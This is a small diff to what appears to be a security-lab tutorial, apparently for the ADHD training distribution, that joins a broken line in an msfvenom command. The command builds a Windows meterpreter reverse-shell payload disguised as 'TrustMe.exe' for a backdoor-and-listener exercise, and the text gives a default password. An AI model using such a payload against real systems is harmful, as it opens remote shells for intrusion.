@@ -43,8 +43,7 @@ Now, run the following commands to start a simple backdoor and backdoor listener
 $ `sudo su -`
 Please note, the adhd password is adhd.
 
-/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
--f exe -o /tmp/TrustMe.exe`
+/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 -f exe -o /tmp/TrustMe.exe`
 
 /#`cd /tmp`
 
